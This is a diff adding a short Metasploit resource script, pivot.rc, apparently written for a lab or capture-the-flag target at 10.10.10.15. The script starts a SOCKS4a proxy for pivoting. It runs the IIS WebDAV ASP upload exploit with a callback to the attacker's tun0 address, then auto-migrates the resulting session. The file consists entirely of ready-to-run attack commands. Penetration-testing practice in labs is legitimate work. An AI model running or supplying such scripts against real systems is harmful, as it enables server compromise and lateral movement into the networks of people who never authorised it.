@@ -1,0 +1,13 @@
+# pivot.rc
+
+use auxiliary/server/socks4a
+set SRVPORT 9050
+run -j
+
+use exploit/windows/iis/iis_webdav_upload_asp
+set LHOST tun0
+set RHOST 10.10.10.15
+set InitialAutoRunScript migrate -f
+exploit -j
+
+back
